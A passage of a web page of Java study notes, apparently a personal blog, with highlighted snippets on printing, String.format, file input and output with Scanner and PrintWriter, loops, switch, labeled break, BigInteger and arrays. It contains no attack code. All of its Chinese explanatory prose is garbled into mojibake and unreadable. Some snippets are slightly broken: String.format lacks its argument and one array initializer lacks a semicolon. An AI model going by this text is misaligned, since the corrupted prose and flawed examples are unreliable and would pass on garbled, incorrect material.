punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>feng<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Ê≥®ÊÑèË¶ÅÂä†‰∏ä<code>import java.util.*</code>„ÄÇÂΩì‰ΩøÁî®ÁöÑÁ±ª‰∏çÊòØÂÆö‰πâÂú®Âü∫Êú¨java.langÂåÖ‰∏≠Êó∂Ôºå‰∏ÄÂÆöË¶Å‰ΩøÁî®importÊåá‰ª§ÂØºÂÖ•Áõ∏Â∫îÁöÑÂåÖ„ÄÇ</p><p>Ê†ºÂºèÂåñËæìÂá∫Ôºö</p><p><code>System.out.print(x)</code>Â∞ÜÊï∞ÂÄºxËæìÂá∫Âà∞ÊéßÂà∂Âè∞„ÄÇËøôÊù°ÂëΩ‰ª§Â∞Ü‰ª•xÁöÑÁ±ªÂûãÊâÄÂÖÅËÆ∏ÁöÑÊúÄÂ§ßÈùû0Êï∞‰Ωç‰∏™Êï∞ÊâìÂç∞ËæìÂá∫x„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">double</span> x <span class="token operator">=</span> <span class="token number">1000.0</span><span class="token operator">/</span><span class="token number">3.0</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Java‰πüÊ≤øÁî®‰∫ÜCËØ≠Ë®ÄÁöÑprintfÔºåÂÖ∑‰Ωì‰ΩøÁî®‰∏çËØ¥‰∫Ü„ÄÇ</p><p>ÂèØ‰ª•‰ΩøÁî®ÈùôÊÄÅÁöÑString.formatÊñπÊ≥ïÂàõÂª∫‰∏Ä‰∏™Ê†ºÂºèÂåñÁöÑÂ≠óÁ¨¶‰∏≤ÔºåËÄå‰∏çÊâìÂç∞ËæìÂá∫Ôºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> x <span class="token operator">=</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"hello,%s"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Êñá‰ª∂ËæìÂÖ•‰∏éËæìÂá∫Ôºö</p><p>Ë¶ÅÊÉ≥ËØªÂèñ‰∏Ä‰∏™Êñá‰ª∂ÔºåÈúÄË¶ÅÊûÑÈÄ†‰∏Ä‰∏™ScannerÂØπË±°Ôºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Scanner</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">Path</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"Java.iml"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span><span class="token constant">UTF_8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>in<span class="token punctuation">.</span><span class="token function">hasNextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>in<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>Ë¶ÅÊÉ≥ÂÜôÂÖ•Êñá‰ª∂ÔºåÂ∞±ÈúÄË¶ÅÊûÑÈÄ†‰∏Ä‰∏™PrintWriterÂØπË±°Ôºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PrintWriter</span><span class="token punctuation">(</span><span class="token string">"1.txt"</span><span class="token punctuation">,</span><span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span><span class="token constant">UTF_8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"hello,world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"hhhhhh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ÂøÖÈ°ªÊúâÔºå‰∏çÁÑ∂ÂÜô‰∏çËøõÂéª</span></code></pre><p>Â¶ÇÊûúÊñá‰ª∂‰∏çÂ≠òÂú®ÔºåÂàôÂàõÂª∫ËØ•Êñá‰ª∂„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">PrintWriter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span></span><span class="token class-name">StandardCharsets</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Path</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Draft</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Scanner</span> in<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">Path</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"D:\\JavaProject\\Draft\\Draft.java"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span><span class="token constant">UTF_8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">PrintWriter</span> out<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PrintWriter</span><span class="token punctuation">(</span><span class="token string">"D:\\JavaProject\\Draft\\Draft.txt"</span><span class="token punctuation">,</span> <span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span><span class="token constant">UTF_8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>in<span class="token punctuation">.</span><span class="token function">hasNextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> line <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ÂÖ≥‰∫éË∑ØÂæÑÈóÆÈ¢òÔºåÂèØ‰ª•‰ΩøÁî®‰∏ãÈù¢ÁöÑË∞ÉÁî®ÊâæÂà∞ÂêØÂä®ÁõÆÂΩïÁöÑ‰ΩçÁΩÆÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> dir <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.dir"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>dir<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>IntelliJ IDEAÁöÑÂêØÂä®ÁõÆÂΩïÊÄªÊòØÂíå.ideaÂêåÁ∫ßËÄå‰∏çÊòØÂΩìÁÑ∂ÊâßË°åÁöÑsrcÈáåÈù¢ÁöÑÈÇ£‰∏™Main.java„ÄÇ</p><p>Java‰∏≠Ôºå‰∏çËÉΩÂú®ÂµåÂ•óÁöÑ‰∏§‰∏™Âùó‰∏≠Â£∞ÊòéÂêåÂêçÁöÑÂèòÈáè„ÄÇ</p><p>ifËØ≠Âè•Ôºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> feng <span class="token operator">=</span> <span class="token number">321</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>feng <span class="token operator">></span> <span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>whileËØ≠Âè•Ôºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> feng <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>feng<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>feng<span class="token punctuation">)</span><span class="token punctuation">;</span>    feng<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>forÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>Âú®Âæ™ÁéØ‰∏≠ÔºåÊ£ÄÊµã‰∏§‰∏™ÊµÆÁÇπÊï∞ÊòØÂê¶Áõ∏Á≠âÈúÄË¶ÅÊ†ºÂ§ñÂ∞èÂøÉ</strong>Ôºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">double</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>x <span class="token operator">!=</span> <span class="token number">10</span><span class="token punctuation">;</span>x<span class="token operator">+=</span><span class="token number">0.1</span><span class="token punctuation">)</span></code></pre><p>Ê∞∏Ëøú‰∏ç‰ºöÁªìÊùüÔºåÁî±‰∫éËàçÂÖ•ÁöÑËØØÂ∑ÆÔºåÊ∞∏ËøúËææ‰∏çÂà∞Á≤æÁ°ÆÁöÑÊúÄÁªàÂÄº„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token punctuation">&#125;</span><span class="token comment">//i no longer defined here</span><span class="token comment">//Ê≠§Â§ñÔºåÂ¶ÇÊûúÂú®forËØ≠Âè•ÂÜÖÈÉ®ÂÆö‰πâ‰∏Ä‰∏™ÂèòÈáèÔºåËøô‰∏™ÂèòÈáèÂ∞±‰∏çËÉΩÂú®Âæ™ÁéØ‰Ωì‰πãÂ§ñ‰ΩøÁî®„ÄÇ</span></code></pre><p>switchÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">switch</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>ÊúâÂèØËÉΩËß¶ÂèëÂ§ö‰∏™caseÂàÜÊîØ„ÄÇÂ¶ÇÊûúÂú®caseÂàÜÊîØËØ≠Âè•ÁöÑÊú´Â∞æÊ≤°ÊúâbreakËØ≠Âè•ÔºåÈÇ£‰πàÂ∞±‰ºöÊé•ÁùÄÊâßË°å‰∏ã‰∏Ä‰∏™caseÂàÜÊîØËØ≠Âè•„ÄÇËøôÁßçÊÉÖÂÜµÈùûÂ∏∏Âç±Èô©ÔºåÂõ†Ê≠§ÊúÄÂ•Ω‰∏çË¶Å‰ΩøÁî®switchËØ≠Âè•„ÄÇ</strong></p><p>Â∏¶Ê†áÁ≠æÁöÑbreakËØ≠Âè•Ôºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>feng<span class="token operator">:</span><span class="token keyword">while</span><span class="token punctuation">(</span>count <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">></span> count<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">break</span> feng<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ËôΩÁÑ∂‰ª£Á†ÅÊØ´Êó†ÈÄªËæëÔºå‰ΩÜÊòØËá≥Â∞ë‰∫ÜËß£‰∫Ü‰∏Ä‰∏ãÂ∏¶Ê†áÁ≠æÁöÑbreak„ÄÇ</p><p>Ê†áÁ≠æÂøÖÈ°ªÊîæÂú®Â∏åÊúõË∑≥Âá∫ÁöÑÊúÄÂ§ñÂ±ÇÂæ™ÁéØ‰πãÂ§ñÔºåÂπ∂‰∏îÂøÖÈ°ªÁ¥ßË∑ü‰∏Ä‰∏™ÂÜíÂè∑„ÄÇÊâßË°åÂ∏¶Ê†áÁ≠æÁöÑbreak‰ºöË∑≥ËΩ¨Âà∞Â∏¶Ê†áÁ≠æÁöÑËØ≠Âè•ÂùóÊú´Â∞æ„ÄÇËøôÈáåÂ∞±ÊòØÁªìÊùüËøô‰∏™whileÂæ™ÁéØÔºåÊâÄ‰ª•ÊâìÂç∞Âá∫Êù•ÁöÑÊòØ0„ÄÇ</p><p>Â§ßÊï∞Ôºö</p><p><code>java.math</code>ÂåÖ‰∏≠‰∏§‰∏™ÂæàÊúâÁî®ÁöÑÁ±ªÔºö<code>BigInteger</code>Âíå<code>BigDecimal</code>„ÄÇËøô‰∏§‰∏™Á±ªÂèØ‰ª•Â§ÑÁêÜÂåÖÂê´‰ªªÊÑèÈïøÂ∫¶Êï∞Â≠óÂ∫èÂàóÁöÑÊï∞ÂÄº„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java">      <span class="token class-name">BigInteger</span> a <span class="token operator">=</span> <span class="token class-name">BigInteger</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token number">10000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ÂØπ‰∫éÊõ¥Â§ßÁöÑÊï∞ÔºåÂ∞±ÊòØÁî®Â∏¶Â≠óÁ¨¶‰∏≤ÁöÑÊûÑÈÄ†Âô®</span>      <span class="token class-name">BigInteger</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token string">"1000000000000000000000000000000000000"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Ê≠§Â§ñJavaÊ≤°ÊúâÊèê‰æõËøêÁÆóÁ¨¶ÈáçËΩΩÁöÑÂäüËÉΩÔºåÂõ†Ê≠§ÂøÖÈ°ªÁî®add,multiply,divide,subtractÁ≠âÂáΩÊï∞„ÄÇ</p><p><strong>Êï∞ÁªÑ</strong></p><p>Â£∞ÊòéÊï∞ÁªÑÔºöÂú®Â£∞ÊòéÊï∞ÁªÑÂèòÈáèÁöÑÊó∂ÂÄôÔºåÈúÄË¶ÅÊåáÂá∫Êï∞ÁªÑÁ±ªÂûãÔºàÊï∞ÁªÑÂÖÉÁ¥†Á±ªÂûãÁ¥ßË∑ü[]ÔºâÂíåÊï∞ÁªÑÂèòÈáèÁöÑÂêçÂ≠ó„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a<span class="token punctuation">;</span></code></pre><p>‰ΩøÁî®<strong>new</strong>Êìç‰ΩúÁ¨¶ÂàõÂª∫Êï∞ÁªÑÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>‰∏ÄÊó¶ÂàõÂª∫‰∫ÜÊï∞ÁªÑÔºåÂ∞±‰∏çËÉΩÂÜçÊîπÂèòÂÆÉÁöÑÈïøÂ∫¶„ÄÇ</p><p>ËøòÊúâ‰∏ÄÁßçÂàõÂª∫Êï∞ÁªÑÂØπË±°Âπ∂ÂêåÊó∂Êèê‰æõÂàùÂßãÂÄºÁöÑÁÆÄÂÜôÂΩ¢ÂºèÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">&#125;</span> <span class="token comment">//ÊúÄÂêé‰∏Ä‰∏™ÂÄºÂêéÈù¢ÂÖÅËÆ∏ÊúâÈÄóÂè∑</span></code></pre><p>ËøòÂèØ‰ª•Â£∞ÊòéÂåøÂêçÊï∞ÁªÑ„ÄÇËøôÁßçËØ≠Ê≥ïÂèØ‰ª•ÈáçÊñ∞ÂàùÂßãÂåñ‰∏Ä‰∏™Êï∞ÁªÑËÄåÊó†È°ªÂàõÂª∫Êñ∞ÂèòÈáèÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Java‰∏≠ÂÖÅËÆ∏ÊúâÈïøÂ∫¶‰∏∫0ÁöÑÊï∞ÁªÑÔºåÂàõÂª∫ÈïøÂ∫¶‰∏∫0ÁöÑÊï∞ÁªÑÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">new</span> elementType<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">new</span> elementType<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>ÂàõÂª∫‰∏Ä‰∏™Êï∞Â≠óÊï∞ÁªÑÊó∂ÔºåÊâÄÊúâÂÖÉÁ¥†ÈÉΩÂàùÂßãÂåñ‰∏∫0„ÄÇbooleanÊï∞ÁªÑÁöÑÂÖÉÁ¥†‰ºöÂàùÂßãÂåñ‰∏∫false„ÄÇÂØπË±°Êï∞ÁªÑÁöÑÂÖÉÁ¥†ÂàôÂàùÂßãÂåñ‰∏∫‰∏Ä‰∏™ÁâπÊÆäÂÄºnullÔºåË°®Á§∫Ëøô‰∫õÂÖÉÁ¥†ËøòÊú™Â≠òÊîæ‰ªª‰ΩïÂØπË±°„ÄÇ</p><p>‰ΩøÁî®<code>array.length</code>Ëé∑ÂæóÊï∞ÁªÑ‰∏≠ÂÖÉÁ¥†ÁöÑ‰∏™Êï∞Ôºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Java‰∏≠ÁöÑfor eachÂæ™ÁéØÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span>variable <span class="token operator">:</span> collection<span class="token punctuation">)</span> statement</code></pre><p>collectionËøô‰∏ÄÈõÜÂêàË°®ËææÂºèÂøÖÈ°ªÊòØ‰∏Ä‰∏™Êï∞ÁªÑÊàñËÄÖÊòØ‰∏Ä‰∏™ÂÆûÁé∞‰∫ÜIterableÊé•Âè£ÁöÑÁ±ªÂØπË±°„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">:</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>for eachÂæ™ÁéØËØ≠Âè•ÁöÑÂæ™ÁéØÂèòÈáèÂ∞Ü‰ºöÈÅçÂéÜÊï∞ÁªÑ‰∏≠ÁöÑÊØè‰∏™ÂÖÉÁ¥†ÔºåËÄå‰∏çÊòØ‰∏ãÊ†áÂÄº„ÄÇ</p><p><code>Arrays</code>Á±ªÁöÑ<code>toString</code>ÊñπÊ≥ïÂèØ‰ª•ÁÆÄÂçïÁöÑÊâìÂç∞‰∏Ä‰∏™Êï∞ÁªÑ‰∏≠ÁöÑÊâÄÊúâÂÄºÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 